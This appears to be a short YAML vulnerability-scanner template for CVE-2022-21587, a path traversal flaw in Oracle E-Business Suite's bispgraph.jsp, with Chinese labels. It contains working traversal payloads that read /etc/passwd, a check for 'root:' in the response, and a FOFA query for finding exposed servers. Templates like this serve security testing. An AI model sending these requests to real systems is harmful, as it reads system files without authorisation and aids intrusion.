id: poc-yaml-oracle-e-business-suite-bispgraphjsp-path-traversal
info:
  name: Oracle E-Business Suite bispgraph.jsp 路径遍历漏洞
  severity: high
  tags:
  - CVE-2022-21587
  - 两高一弱
  finger: Oracle-E-Business-Suite
  fofa: app="Oracle-E-Business-Suite"
variables:
  path: 'OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/

    OA_HTML/jsp/bsc/bscpgraph.jsp?ifl=/etc/&ifn=passwd'
requests:
- method: GET
  path: /{{.path}}
  expression: 'status_code == 200 &&

    contains(body,"root:") &&

    contains(body,"/bin/bash")

    '
transport: http
